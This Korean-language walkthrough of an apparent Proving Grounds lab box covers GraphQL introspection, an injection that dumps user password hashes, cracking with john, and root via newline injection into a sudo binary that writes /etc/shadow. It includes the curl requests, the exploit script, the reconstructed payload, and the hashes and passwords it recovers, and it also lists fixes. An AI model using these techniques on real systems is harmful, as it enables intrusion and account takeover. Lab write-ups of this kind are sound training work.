---
tags:
  - type/machine
  - platform/pg
  - os/linux
  - status/solved
  - tech/enum/dirbust
  - tech/web/graphql
  - tech/web/sqli
  - tech/cred/crack
  - tech/lin/sudo-abuse
type: machine
platform: pg
os: linux
ip: 192.168.248.201
ports: [22, 80]
services: [http, ssh]
status: solved
manual_tags: true
tech_count: 5
---

> [!info] 요약
> 타겟 `192.168.248.201` · 호스트명 `graph` · Ubuntu 18.04.6 LTS(커널 4.15.0-177) · Fundamental · 플래그 2개
> 진입점: tcp/80 Node.js/Express 의 GraphQL 엔드포인트 → introspection 으로 `users(searchTerm)` 필드 발견 → 인자 주입으로 admin/jane/josh sha512crypt 해시 전량 덤프 → john+rockyou 로 jane 크랙(`oakland`) → SSH
> 권한상승: `sudo /usr/local/bin/pass-gen` 인자에 개행을 섞어 `/etc/shadow` 에 josh 행을 원본보다 «앞»에 삽입 → josh 로그인 → root 해시 확보(읽어낸 명령 자체는 [가정]) → john 으로 크랙(`espartaco`) → josh 셸에서 `su - root`
> 시행착오·교훈 → [[_PLAYBOOK]]

## Target #1 – 192.168.248.201

### Initial Access – GraphQL introspection 이 드러낸 users(searchTerm) 인자 주입으로 전 계정 해시를 덤프하고 크랙해 SSH 진입

**Vulnerability Explanation:** 두 결함이 체인됨.
- GraphQL introspection(`__schema`·`__type`)이 무인증으로 열려 있어 스키마 전체 — 필드명 `users`, 인자명 `searchTerm`, 반환 타입 `[String]` — 가 그대로 노출됨
- 그 `searchTerm` 인자가 백엔드 질의에 문자열로 이어붙어 UNION 계열 주입이 성립. 필터된 이름 목록에 `이름:해시` 쌍이 함께 실려 나옴 = in-band 덤프
- 저장된 것이 sha512crypt(`$6$`)라도 평문이 rockyou 사전값이면 방어가 되지 않음. 앱 DB 의 해시가 **OS 계정 비밀번호와 동일**해 SSH 로 그대로 재사용됨

**Vulnerability Fix:**
- 운영 환경에서 introspection 을 차단. `express-graphql` 의 `graphiql: false` 만으로는 부족하고 스키마 레벨에서 `__schema`/`__type` 을 막는 미들웨어가 필요함
- `searchTerm` 을 파라미터 바인딩으로 처리. 쿼리 문자열 연결 금지
- 비밀번호 정책으로 사전 단어 금지(`oakland` 은 rockyou 4,451번째 줄). 앱 계정과 OS 계정의 자격증명을 분리할 것

**Severity:** High — 무인증 원격에서 전 계정 해시 덤프, 크랙 후 즉시 대화형 셸 획득(단독으로 RCE 는 아님)

**Steps to reproduce the attack:**
1. tcp/80 배너가 `Node.js Express framework` → REST 정적 파일 프로빙 대신 GraphQL 엔드포인트를 후보 경로 배치로 탐색
2. `Must provide query string.` 응답이 오는 경로를 엔드포인트로 확정
3. `{__schema{queryType{name}mutationType{name}types{name kind}}}` 로 스키마 존재 확인
4. `{__type(name:"Query"){fields{name args{name type{...}}}}}` 로 `users(searchTerm: String!): [String]` 획득
5. `searchTerm` 에 주입값을 넣어 `admin`/`jane`/`josh` 의 `이름:해시` 6원소 배열 회수
6. `이름:해시` 3줄을 john 형식으로 정리 → rockyou 로 크랙 → jane `oakland`
7. `oakland` 로 jane SSH 로그인

### Service Enumeration

**Port Scan Results**

| IP Address | Ports Open |
|---|---|
| 192.168.248.201 | TCP: 22, 80 |

top-1000 은 22·80 뿐이고 `-p-` 전량 스캔도 동일함(`nmap-full.txt`). 즉 이 박스에서 `-p-` 는 추가 수확이 없었음.

```bash
ssh kali@10.44.44.128 "nmap --privileged -Pn -n -sCV -p 22,80 -oN nmap-quick.txt 192.168.248.201"
```

```text
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 f0:85:61:65:d3:88:ad:49:6b:38:f4:ac:5b:90:4f:2d (RSA)
|   256 05:80:90:92:ff:9e:d6:0e:2f:70:37:6d:86:76:db:05 (ECDSA)
|_  256 c3:57:35:b9:8a:a5:c0:f8:b1:b2:e9:73:09:ad:c7:9a (ED25519)
80/tcp open  http    Node.js Express framework
|_http-title: Welcome at Graph!
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
— 출처: `~/PG/Graph/nmap-quick.txt`

**버전 판정 — 독립 근거 2개.** ① nmap 배너 `OpenSSH 7.6p1 Ubuntu 4ubuntu0.7` + 원시 SSH 배너 `SSH-2.0-OpenSSH_7.6p1 Ubuntu-4ubuntu0.7`(`svc/ssh-banner.txt`) ② 셸 획득 후 `/etc/os-release` 와 `uname -a` 가 `Ubuntu 18.04.6 LTS (Bionic Beaver)` · `Linux graph 4.15.0-177-generic`(`harvest_jane_full.txt` 「OS」절). 둘이 일치.

Node.js 쪽도 마찬가지로 두 근거임 — HTTP 응답 헤더 `X-Powered-By: Express`(`web-80/root-followed.headers`)와, 셸 획득 후 `getcap` 의 `/usr/bin/node = cap_net_bind_service+ep`(`harvest_jane_full.txt` 「CAPS」절). 후자는 **node 가 root 없이 80 을 바인딩한 이유**이기도 함.

UDP top-100 은 볼 것이 없었음.

```text
Not shown: 90 open|filtered udp ports (no-response)
PORT      STATE  SERVICE
445/udp   closed microsoft-ds
518/udp   closed ntalk
1026/udp  closed win-rpc
1028/udp  closed ms-lsa
1900/udp  closed upnp
2222/udp  closed msantipiracy
3456/udp  closed IISrpc-or-vat
32769/udp closed filenet-rpc
49153/udp closed unknown
49188/udp closed unknown
```
— 출처: `~/PG/Graph/nmap-udp-top100.txt`

SNMP 도 빈손. 커뮤니티 문자열 5종(`public`/`private`/`community`/`manager`/`admin`) 전부 무응답.

```text
Scanning 1 hosts, 5 communities
```
— 출처: `~/PG/Graph/svc/snmp-onesixtyone.txt`

⚠️ 161/udp 는 위 `closed` 10개 목록에 **없음** — `Not shown: 90 open|filtered` 쪽에 들어감. 즉 「닫힘이 확인된」 것이 아니라 **「열려 있다는 근거가 없는」** 상태임. `onesixtyone` 무응답과 합쳐 실질적으로 빈손으로 처리함.

**tcp/80 랜딩 페이지** — Bootstrap 템플릿(「Welcome to Graph」 + 「Coming soon」). `whatweb` 도 `Bootstrap, HTML5, Script, Title[Welcome at Graph!], X-Powered-By[Express]` 에 IP·Country 가 붙은 것이 전부라 nmap 배너 이상을 주지 않음(`web-80/whatweb.txt`).

![[PG-Graph-web80-landing.png]]

정적 파일 26개 경로를 배치로 프로빙 — 전부 404, 크기까지 32바이트로 동일함.

```text
404 32  /robots.txt  -> probe_robots.txt
404 32  /sitemap.xml  -> probe_sitemap.xml
404 32  /CHANGELOG.md  -> probe_CHANGELOG.md
404 32  /CHANGELOG.txt  -> probe_CHANGELOG.txt
404 32  /CHANGELOG  -> probe_CHANGELOG
```
— 출처: `~/PG/Graph/web-80/probe-index.txt` 앞 5줄(26줄 전부 `404 32`)

32바이트의 정체는 앱이 미매칭 경로 전체에 돌려주는 한 줄임. `probe_admin_` 등 개별 응답 파일 내용이 동일함을 확인.

```json
{"message":"404 page not found"}
```
— 출처: `~/PG/Graph/web-80/probe_admin_`

`web-80/probe-interesting.txt` 는 **0바이트임.** recon 스크립트가 `grep -E '^(200|401|403|301|302) '` 로 거른 결과라 「해당 줄이 하나도 없었다」는 관측이 파일로 남은 것임 — 빈 파일이 아니라 빈 결과의 기록임.

gobuster 는 recon 스크립트가 백그라운드로 던짐.

```bash
gobuster dir -u 'http://192.168.248.201:80/' -w '/usr/share/seclists/Discovery/Web-Content/raft-small-words.txt' -k -t 30 -q --no-color --no-progress \
  -x php,txt,html,bak,zip,old -b 404,403 -o '/home/kali/PG/Graph/gobuster-80.txt'
```
— 출처: `~/PG/Graph/.bg-gobuster.sh`

확장자 6종까지 붙어 탐색 폭이 커 **14:52 시작 → 15:04 완료(약 12분)** 걸림(`.bg-gobuster.sh` mtime 14:52:01 vs `gobuster-80.txt` mtime 15:04:53). 결과는 정적 자산 폴더 하나뿐.

```text
/static               (Status: 301) [Size: 179] [--> /static/]
/Static               (Status: 301) [Size: 179] [--> /Static/]
/STATIC               (Status: 301) [Size: 179] [--> /STATIC/]
```
— 출처: `~/PG/Graph/gobuster-80.txt`

14:54:47 에 `gobuster-raft.txt` 라는 **별도 수동 실행** 결과가 하나 더 남아 있음. ANSI 컬러 이스케이프가 살아 있고 끝에 `DONE` 마커가 붙어 배경 스크립트(`--no-color`)와 구분됨.

```text
/static              ^[[36m (Status: 301)^[[0m [Size: 179]^[[34m [--> /static/]^[[0m
/Static              ^[[36m (Status: 301)^[[0m [Size: 179]^[[34m [--> /Static/]^[[0m
/STATIC              ^[[36m (Status: 301)^[[0m [Size: 179]^[[34m [--> /STATIC/]^[[0m
DONE
```
— 출처: `~/PG/Graph/gobuster-raft.txt` (`cat -v` 표기 — 제어문자를 `^[` 로 렌더한 것 외에 원문 그대로)

정확한 명령행은 산출물에 없어 워드리스트가 raft 계열이라는 것 외에는 **관측 없음**임. 결과는 배경 스캔과 완전히 동일했고(`/static` 3종, 대소문자 변형뿐) `/static` 은 정적 자산 폴더일 뿐 그 이상의 의미가 없었음.

**앱 소스 회수는 실패함.** `app.js`·`server.js`·`package.json`·`.git/HEAD`·`/static/`·`/static/js/`·`/static/css/` 7경로를 따로 찔렀으나 전부 32바이트 404(`gql/s_*.txt` 7개, 14:53:40 — GraphQL 덤프 «뒤»에 돌림). Express 정적 서빙 경로 밖이라 **취약 코드 자체는 끝까지 관측되지 않음.**

배너가 `Node.js Express framework` 인 시점에 PHP·WordPress 계열 경로(`phpinfo.php`·`wp-login.php`·`.env`)는 헛수고가 될 공산이 컸고, 위 26경로 프로빙 결과가 그대로 그렇게 나왔음.

### Initial Access – GraphQL 인자 주입 → jane SSH

**엔드포인트 찾기.** `/graphql`·`/api/graphql`·`/graphiql`·`/playground`·`/console`·`/altair` 등 18개 후보 경로를 배치로 GET.

⚠️ 아래 루프는 `gql/GET_*.txt` **파일명 18개에서 역산한 재구성**임 — 실제로 친 명령행은 관측 없음.

```bash
for p in graphql api/graphql v1/graphql api graphiql playground query console gql \
         subscriptions v2/graphql api/v1/graphql graphql-explorer altair \
         graphql.php index.php graphql/console graphql/v1; do
  curl -s "http://192.168.248.201/$p" -o "gql/GET_${p//\//_}.txt"
done
```

대부분 위의 32바이트 404 JSON. 크기가 53바이트로 다른 것이 넷이었고 내용은 전부 같았음.

```json
{"errors":[{"message":"Must provide query string."}]}
```
— 출처: `gql/GET_graphql.txt`·`gql/GET_graphql_v1.txt`·`gql/GET_graphql_console.txt`·`gql/get_bare.txt` (넷 다 바이트 동일)

`Must provide query string` 은 GraphQL 엔진(예: `express-graphql`)이 **경로는 존재하지만 쿼리 파라미터가 없을 때** 내는 오류임. 404 와 명확히 다른 이 문구가 곧 「여기 GraphQL 이 있다」는 신호임.

**[가정] 엔드포인트는 하나(`/graphql`)이고 나머지 셋은 그 하위 경로임.** 저장 파일명이 `${p//\//_}` 로 `/` 를 `_` 로 바꾼 형태라 `GET_graphql_v1.txt` 가 `/graphql_v1` 에서 왔는지 `/graphql/v1` 에서 왔는지 파일명만으로는 구분되지 않음. 다만 `v1/graphql`·`api/graphql` 처럼 `graphql` 을 포함하는 다른 경로는 전부 404 였는데 이 둘만 응답한 것은, `app.use('/graphql', …)` 로 마운트된 핸들러가 `/graphql` 과 그 하위 경로를 함께 받는 것으로 보면 그대로 설명됨. `get_bare.txt` 는 같은 엔드포인트 재확인 요청으로 보이며(같은 응답, introspection 직전 시각) 별개 경로의 증거가 아님.

**Introspection.**

⚠️ 이 절의 `curl` 줄은 **응답 JSON 의 필드 구성에서 역산한 재구성**임. 산출물로 남은 것은 응답뿐이고 요청 본문은 기록되지 않음.

```bash
curl -s -X POST http://192.168.248.201/graphql -H 'Content-Type: application/json' \
  -d '{"query":"{__schema{queryType{name}mutationType{name}types{name kind}}}"}'
```

```json
{"data":{"__schema":{"queryType":{"name":"Query"},"mutationType":null,"types":[{"name":"Query","kind":"OBJECT"},{"name":"String","kind":"SCALAR"},{"name":"Boolean","kind":"SCALAR"},{"name":"__Schema","kind":"OBJECT"},{"name":"__Type","kind":"OBJECT"},{"name":"__TypeKind","kind":"ENUM"},{"name":"__Field","kind":"OBJECT"},{"name":"__InputValue","kind":"OBJECT"},{"name":"__EnumValue","kind":"OBJECT"},{"name":"__Directive","kind":"OBJECT"},{"name":"__DirectiveLocation","kind":"ENUM"}]}}}
```
— 출처: `~/PG/Graph/gql/introspect_short.json`

`mutationType` 이 `null` — 쓰기 작업(계정 생성 등)은 이 스키마로 불가함. 처음부터 「읽기 쪽 필드에서 무엇을 새어 나오게 할까」로 방향을 잡을 근거가 됨. 사용자 정의 타입도 `Query` 하나뿐이고 나머지는 내장 스칼라 2종(`String`·`Boolean`)과 introspection 메타 타입 8종(`__*`)임.

```bash
curl -s -X POST http://192.168.248.201/graphql -H 'Content-Type: application/json' \
  -d '{"query":"{__type(name:\"Query\"){fields{name args{name type{name kind ofType{name}}}type{name kind ofType{name}}}}}"}'
```

```json
{"data":{"__type":{"name":"Query","fields":[{"name":"users","description":null,"args":[{"name":"searchTerm","type":{"name":null,"kind":"NON_NULL","ofType":{"name":"String"}}}],"type":{"name":null,"kind":"LIST","ofType":{"name":"String"}}}]}}}
```
— 출처: `~/PG/Graph/gql/query_fields.json`

`Query` 에 필드가 **`users(searchTerm: String!): [String]` 하나뿐**임. 반환 타입이 객체가 아니라 **문자열 리스트**인 점이 특이함 — 정상 스키마라면 `User { username, … }` 같은 객체를 돌려주는 편이 자연스러움. 이 설계가 뒤에서 「이름」과 「이름:해시」가 한 배열에 섞여 나오는 현상과 맞물림.

**주입.** `searchTerm` 에 값을 채워 질의.

```bash
curl -s -X POST http://192.168.248.201/graphql -H 'Content-Type: application/json' \
  -d '{"query":"query($s:String!){users(searchTerm:$s)}","variables":{"s":"<주입값>"}}'
```

⚠️ **`<주입값>` 의 정확한 문자열은 산출물에 없음 — 관측 없음.** `gql/dump_users.json` 에 남은 것은 응답뿐임.

```json
{"data":{"users":["admin","admin:$6$PRyGjElQ$unCSC/NlXu2KsYEjc1RuIqduAnPpPEwGg5diM4mZZbzhEWIWjhvlaoROBf5UgLWUFUFiEXSBjBmVENBbHO5oK/","jane","jane:$6$4BlcfbYDsQp3BMG$vwPo.Fpjadmz2jqPFPxrNusB8zCM2TBnNU1HuwkO9vWWvt3jFbpJ0ymelX/fyNgoLW9vQ/fJI0mL8vqw96HMX.","josh","josh:$6$g744Ii0AvY$Oce4aPVtE96encnfV5q1MboCBHyz74qw0R6d/iZKxIrHSFUtG3z7LfbAfHu1aoYRgbseH0tG3.nyGZ9qX1Ean."]}}
```
— 출처: `~/PG/Graph/gql/dump_users.json`

![[PG-Graph-graphql-sqli-hashdump.png]]

이 스크린샷은 브라우저 JSON 뷰어 화면(`Pretty-print` 체크박스, 체크 해제 상태)이고 `dump_users.json` 과 내용이 같음(`shot_graphql_sqli.png` mtime 15:06:34 — root 획득 뒤임). **[가정]** 헤드리스 chromium 캡처.

⚠️ **원본이 라이브 GET 응답인지 저장된 `dump_users.json` 을 `file://` 로 연 것인지는 구분되지 않음** — URL 바가 잘려 있고 `web-80/chromium.log` 에는 랜딩 캡처 기록만 있음. 어느 쪽이든 주입 문자열은 복원되지 않음.

배열 원소는 정확히 **6개** — `admin`/`jane`/`josh` 3개(순수 이름)와 `admin:해시`/`jane:해시`/`josh:해시` 3개(이름:해시 쌍).

**[가정]** 이 모양은 원래의 필터 질의(`WHERE username LIKE '%검색어%'` 류로 이름만 반환)에 **`UNION SELECT`** 로 이름과 해시를 이어붙인 두 번째 질의를 덧붙였을 때 나오는 전형적 형태임. 이름이 「단독 → 그 이름:해시」 순으로 번갈아 나오는 배치도 두 질의 결과를 합친 뒤 사전순 정렬하면 그대로 나옴(`admin` 이 `admin:$6$…` 의 접두라 먼저 옴). 다만 요청 본문을 남기지 않아 **정확한 주입 문법(따옴표 위치, `--`/`#` 주석 처리 여부)은 확정할 수 없음.**

**크랙.** 응답에서 `이름:해시` 3줄만 뽑아 john 이 바로 먹는 형식으로 정리함.

```text
admin:$6$PRyGjElQ$unCSC/NlXu2KsYEjc1RuIqduAnPpPEwGg5diM4mZZbzhEWIWjhvlaoROBf5UgLWUFUFiEXSBjBmVENBbHO5oK/
jane:$6$4BlcfbYDsQp3BMG$vwPo.Fpjadmz2jqPFPxrNusB8zCM2TBnNU1HuwkO9vWWvt3jFbpJ0ymelX/fyNgoLW9vQ/fJI0mL8vqw96HMX.
josh:$6$g744Ii0AvY$Oce4aPVtE96encnfV5q1MboCBHyz74qw0R6d/iZKxIrHSFUtG3z7LfbAfHu1aoYRgbseH0tG3.nyGZ9qX1Ean.
```
— 출처: `~/PG/Graph/hashes.txt`

```text
Using default input encoding: UTF-8
Loaded 3 password hashes with 3 different salts (sha512crypt, crypt(3) $6$ [SHA512 128/128 AVX 2x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 4 OpenMP threads
Press Ctrl-C to abort, or send SIGUSR1 to john process for status
oakland          (jane)     
1g 0:02:31:54 DONE (2026-08-21 17:25) 0.000109g/s 1573p/s 3148c/s 3148C/s  naptown410..^D*^C7M-BM-!Vamos!^C
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```
— 출처: `~/PG/Graph/john.out` (`cat -A` 표기 — 비출력 문자를 `^`/`M-` 로 렌더한 것 외에 원문 그대로)

**워드리스트는 rockyou 이고 완주함.** 명령행 자체는 기록되지 않았으나 세 근거가 일치함 — ① 상태줄의 마지막 후보 `^D*^C7M-BM-!Vamos!^C` 가 `/usr/share/wordlists/rockyou.txt` 의 **마지막 줄**과 동일 ② 상태줄이 함께 찍은 청크 시작 후보 ` naptown410`(선행 공백까지 동일)이 그 파일 14,344,167번째 줄이고, 전체 14,344,392행과의 차 225 가 john 의 청크 크기 256 안에 들어 **마지막 청크**와 맞음 ③ 1573 p/s × 9,114초 ≈ 1,434만 = 그 파일의 전체 줄 수(14,344,392).

따라서 **admin·josh 는 rockyou 전량으로도 깨지지 않았음**이 확정임(「이 실행에서 안 나왔다」가 아니라 완주 후 미크랙). `Session completed.` 가 그 근거임.

이 실행은 **2시간 31분 54초** 돌았고 17:25 에 끝남 — 박스는 그보다 훨씬 전인 15:11 에 정리가 끝나 있었음. jane 만 확보하고 바로 다음 단계로 넘어간 판단이 맞았던 셈임(`oakland` 는 rockyou 4,451번째 줄이라 실행 몇 초 만에 떨어짐).

`oakland` 로 jane 의 SSH 로그인이 그대로 통함(호출 형태는 기록에 없음 — `proof_user.txt` 에 남은 것은 로그인 후 MOTD·프롬프트·출력임).

```bash
jane@graph:~$ whoami; id; hostname; hostname -I; date; cat /home/jane/local.txt
jane
uid=1000(jane) gid=1000(jane) groups=1000(jane)
graph
192.168.248.201
Fri Aug 21 01:54:07 EDT 2026
754551935abdc3b2bdde424a9b5ccb66
jane@graph:~$
```
— 출처: `~/PG/Graph/proof_user.txt` 후반부(앞의 Ubuntu MOTD·`Last login` 배너는 생략)

**타겟 pty 프롬프트(`jane@graph:~$`)가 실제로 캡처된 것** — 대화형 셸에서 원위치 `cat` 한 증거임. 같은 파일 앞부분에 Ubuntu MOTD 와 `Last login: Thu Apr 18 14:10:19 2024 from 192.168.118.13` 이 들어 있는 것도 tty 로그인의 표시임(비대화형 `ssh host "cmd"` 는 MOTD 를 출력하지 않음).

**Local.txt value:**
`754551935abdc3b2bdde424a9b5ccb66` — `/home/jane/local.txt`

### Privilege Escalation – sudo pass-gen 인자 개행 주입으로 /etc/shadow 에 josh 행 선삽입

**Vulnerability Explanation:** jane 이 `sudo` 로 실행할 수 있는 커스텀 바이너리 `/usr/local/bin/pass-gen` 이 사용자 인자를 `/etc/shadow` 행의 필드에 **그대로** 꽂음.
- 인자에 개행이 들어가면 shadow 행이 중간에서 끊기고 뒤쪽이 **새 줄**이 됨 = 임의 shadow 행 삽입
- `/etc/shadow` 는 같은 이름의 행이 여러 개 있어도 오류가 아님. 인증은 `getspnam()` 이 찾은 **첫 일치 행** 하나만 보므로, 원본보다 앞에 자기 해시를 끼워 넣으면 그 계정을 그대로 가져감
- 얻은 josh 계정으로 `/etc/shadow` 를 읽어 root 해시를 회수, rockyou 로 크랙(`espartaco`) 후 `su - root`

**Vulnerability Fix:**
- sudo 로 허용하는 커스텀 바이너리가 사용자 입력을 shadow 필드에 직접 조립하지 말 것. `chpasswd`·`chage` 같은 검증된 도구를 쓰거나 입력에서 `\n`·`:` 을 거부할 것
- shadow 를 쓰는 도구는 **행 단위 무결성**을 검증할 것. 같은 이름의 행이 둘 이상이면 거부하는 것만으로 이 공격이 성립하지 않음(이 박스는 원래부터 josh 행을 셋 갖고 있었고 넷째를 앞에 끼우는 것을 아무도 막지 않음)
- `PermitRootLogin no` 로 변경. 비밀번호 정책으로 사전 단어 금지(`espartaco` 는 rockyou 70,985번째 줄, 36초 만에 크랙)

**Severity:** Critical — 로컬 사용자 하나에서 인자 하나로 임의 계정 탈취, 이어서 root 완전 장악

**Steps to reproduce the attack:**
1. jane 셸에서 `sudo -l` 로 `/usr/local/bin/pass-gen` 허용 확인
2. 심을 josh 비밀번호의 sha512crypt 해시를 Kali 에서 생성(salt `Gr4phSlt`)
3. `pass-gen` 인자를 `99999:7:::<개행>josh:<해시>:19000:0:99999` 형태로 구성
4. `sudo /usr/local/bin/pass-gen "$PAY"` 실행 → jane 행이 끊기고 josh 행이 원본 3행보다 앞에 삽입됨
5. 심은 비밀번호로 josh SSH 로그인
6. josh 로 `/etc/shadow` 를 읽어 root 해시 회수
7. `john --session=graphroot --wordlist=rockyou.txt` 로 크랙 → `espartaco`
8. josh 셸에서 `su - root`

#### jane 열거 — `sudo -l` 원문을 남기지 않음

셸을 잡자마자 `harvest.sh` 를 돌림(`harvest_jane.txt`·`harvest_jane_full.txt`, jane 권한).

```text
===== SUDO =====
sudo: a password is required
(sudo -n 실패 — 비밀번호 필요)
```
— 출처: `~/PG/Graph/harvest_jane_full.txt` 「SUDO」절

`sudo -n` 이 실패하는 것은 당연함 — jane 의 비밀번호(`oakland`)는 이미 있으므로 **비밀번호를 넣어 다시 물어야 하는 지점**임([[Fikklish]] 와 같은 패턴). 그런데 **비밀번호를 넣은 `sudo -S -l` 의 실제 출력은 산출물 어디에도 없음.**

`/usr/local/bin/pass-gen` 이라는 이름은 오직 `exploit_passgen.sh` 안의 호출문으로만 등장함 — `~/PG/Graph/` 전체 grep 결과 그 파일 2줄이 전부이고 `harvest_jane_full.txt`·`harvest_root.txt` 어디에도 없음. 따라서 **`sudo -l` 원문은 관측 없음**임. 다만 그 호출의 «결과»가 타겟 `/etc/shadow` 에 그대로 남았으므로 **jane 이 이 항목을 sudo 로 실행할 수 있었다는 사실 자체는 확정**임. 못 남긴 것은 허용 «조건»(NOPASSWD 여부·인자 제한)임.

같은 harvest 의 shadow 절은 비어 있음.

```text
-- shadow (읽히면) --
```
— 출처: `~/PG/Graph/harvest_jane_full.txt` (이 줄 다음에 내용 없음)

**jane 은 `/etc/shadow` 를 직접 읽지 못함** — `groups=1000(jane)` 뿐이라 `shadow` 그룹이 아니고, harvest 가 시도한 `cat /etc/shadow`(읽히면 내용을 붙이는 구조)가 빈 결과를 남긴 것이 이 부재를 뒷받침함. SUID·SGID·`getcap`·크론에도 걸릴 것이 없었음(`/usr/bin/pkexec`·`/usr/bin/at` 등 배포판 기본 목록, `getcap` 은 `mtr-packet`·`node` 둘뿐).

#### pass-gen 개행 주입 — Kali 에 남은 스크립트 사본은 «망가진» 것임

`~/PG/Graph/exploit_passgen.sh` 원문임. **코드펜스 안은 파일 바이트 그대로이며 한 글자도 고치지 않음.**

```bash
#!/bin/bash
# pass-gen 개행 주입 — jane 의 shadow 행 arr[4] 에 줄바꿈을 넣어 josh 행을 «앞»에 추가한다.
# josh 원행보다 먼저 오므로 getspnam 의 first-match 규칙에 따라 이쪽이 인증에 쓰인다.
H=.RO7QU80esZUwsLy5nnnB3a.Jq4Qp7wW0bWUJS.Wpg09a4.F0gbi5qIBj4LLi2cFgRPsfHkEkGm25F3/Z1
PAY=$99999:7:::njosh:"$H"$:19000:0:99999
echo "--- payload ---"; printf %sn "$PAY"; echo "--- who am i ---"; who am i
echo "--- shadow before ---"; ls -la /etc/shadow
sudo /usr/local/bin/pass-gen "$PAY"
echo "--- shadow after ---"; ls -la /etc/shadow
```
— 출처: `~/PG/Graph/exploit_passgen.sh` (전문)

⚠️ **이 사본을 그대로 따라 치면 동작하지 않음.** 손상 지점이 하필 익스플로잇의 핵심임. 추정이 아니라 **이 사본으로 돌린 실패의 잔재가 타겟 `/etc/shadow` 에 남아 있음**(뒤의 `bogus` 행).

- `PAY=` 행에 있어야 할 **개행(`\n`)이 리터럴 `n` 한 글자**로 남았음(`njosh`). 개행이 없으면 shadow 행이 끊기지 않아 주입이 성립하지 않음
- `H=` 값에서 해시 접두 `$6$Gr4phSlt$PGF3` 이 통째로 빠짐 — `josh_hash.txt` 와 대조하면 그 자리만 비어 있음
- `printf %sn` 도 원래 `printf '%s\n'` 이었을 자리임
- **[가정]** 원본은 ANSI-C 인용(`PAY=$'…\n…'`)이었을 가능성이 높음. 홑따옴표와 백슬래시가 «함께» 사라진 형태가 그것과 맞고, 그렇게 보면 남은 `$`·`"` 위치도 설명됨. 파일을 원격에서 만들 때 이스케이프가 한 겹 먹힌 것으로 봄

심을 해시는 `josh_hash.txt` 임.

```text
$6$Gr4phSlt$PGF3.RO7QU80esZUwsLy5nnnB3a.Jq4Qp7wW0bWUJS.Wpg09a4.F0gbi5qIBj4LLi2cFgRPsfHkEkGm25F3/Z1
```
— 출처: `~/PG/Graph/josh_hash.txt`

`exploit_passgen.sh` 의 `H` 변수는 이 해시에서 `$6$Gr4phSlt$PGF3` 접두를 뗀 나머지와 **바이트 단위로 일치**함. salt 가 `Gr4phSlt` 로 무작위가 아니라 사람이 고른 문자열이라는 점, 그리고 **GraphQL 로 덤프한 josh 해시(`$6$g744Ii0AvY$Oce4…`)와 값이 다르다**는 점이 이것이 원격에서 새어 나온 해시가 아니라 **Kali 에서 직접 만든 해시**임을 뒷받침함. 다만 **그 평문이 무엇이었는지는 기록되지 않음** — 해시 생성 명령이 산출물에 없음.

#### 실행 결과 — 타겟 shadow 에 그대로 남음

`harvest_root.txt` 의 「USERS」절에 shadow 전문이 들어 있음. 이 harvest 는 **복원 «전»** 인 타겟 시각 02:08 에 돌아 공격으로 바뀐 상태를 그대로 담고 있음.

```text
jane:$6$32320834$CYv6J3o8vCo9wN3IiCSkZeQ68JujU3hiJpO3yz6xHuyuzdrbCCwomlgEVqVzFaUPnlqSLUelPKzSGIKlnD7q7.:19831:0:99999:7:::
josh:$6$Gr4phSlt$PGF3.RO7QU80esZUwsLy5nnnB3a.Jq4Qp7wW0bWUJS.Wpg09a4.F0gbi5qIBj4LLi2cFgRPsfHkEkGm25F3/Z1:19000:0:99999:7:::
bogus:!:0:0:99999:7:::njosh:.RO7QU80esZUwsLy5nnnB3a.Jq4Qp7wW0bWUJS.Wpg09a4.F0gbi5qIBj4LLi2cFgRPsfHkEkGm25F3/Z1$:19000:0:99999:7:::
josh:$6$TD5XkGNtP4IHiEWB$t8dCH9af03gRDABH8OulhJDd1KDIbGmU3D83XsjA.hJSU7pLUaWU89xtc7C4EFW3L8oqLTQ2n1NkWN2QMp4vp0:19078:0:99999:7:::
josh:$6$xA4CCC7YQzDl40A$3lCVdpI59TEDZRqIKdFWB4daOmFq3FSgESYnhDNpiZRlitXs17G.HFKXmq2eMkoWJLC0xGPL2DRxJXupo/Orf1:19078:0:99999:7:::
josh:$6$K5zpw246$b9gY23O4mdsnWK.tMyofVScVrRoYBUVcnDhz97ikf.MHgHJJdLdz2ibFAUf4ZXVzeZXGAKdryMTuG9WSv6aW90:19129:0:99999:7:::
node:!:19129:0:99999:7:::
```
— 출처: `~/PG/Graph/harvest_root.txt` 「USERS」절 shadow 부분(시스템 계정 행 생략, 위 7줄이 파일 끝까지 연속)

여기서 세 가지가 한꺼번에 읽힘.

- **jane 행의 `max` 가 `1337` → `99999` 로 바뀌었고 해시도 재생성됨**(복원본 대조는 아래). `pass-gen` 이 인자를 shadow 필드에 그대로 꽂는다는 것이 실측으로 확인된 지점임. 해시는 salt 까지 바뀌었음(`$6$41234567$` → `$6$32320834$`). **[가정]** 도구 이름대로 새 비밀번호를 만든 것이라면 크랙한 `oakland` 은 더 이상 jane 의 비밀번호가 아님 — 다만 같은 평문을 새 salt 로 재해시했을 가능성도 산출물만으로는 배제되지 않음. 익스플로잇 뒤 jane 재로그인은 시도된 적이 없어 **관측 없음**임(`ps auxf` 의 jane `pts/0` 세션은 01:54 에 잡은 것이 그대로 살아 있음)
- **바로 다음 줄이 심어 놓은 `josh:$6$Gr4phSlt$…` 행임.** 인자의 개행이 실제로 파일을 끊었다는 뜻이고, 이 행은 박스 원본의 josh 행 3개보다 **앞**에 있음 = `getspnam()` 첫 일치 규칙에서 이기는 위치임. **주입 성공**
- **`bogus:` 로 시작하는 줄은 개행이 «안» 들어간 실행의 잔재임.** 리터럴 `njosh`, 접두 없는 해시, 후행 `$` 셋이 `exploit_passgen.sh` 의 손상된 문자열과 **정확히 일치**함 — 즉 Kali 에 남은 사본은 **실패한 쪽**임. ⚠️ 다만 `bogus` 라는 계정명이 어디서 왔는지, `pass-gen` 의 정확한 인자 규약이 무엇인지는 **관측 없음**(사본의 인자에는 `bogus` 가 없고 바이너리를 회수하지 않음)

**성공한 페이로드는 저장되지 않았으나 결과에서 역산됨.** jane 행과 josh 행을 이어 붙이면 `pass-gen` 이 받은 인자가 그대로 떨어짐.

```text
99999:7:::
josh:$6$Gr4phSlt$PGF3.RO7QU80esZUwsLy5nnnB3a.Jq4Qp7wW0bWUJS.Wpg09a4.F0gbi5qIBj4LLi2cFgRPsfHkEkGm25F3/Z1:19000:0:99999
```
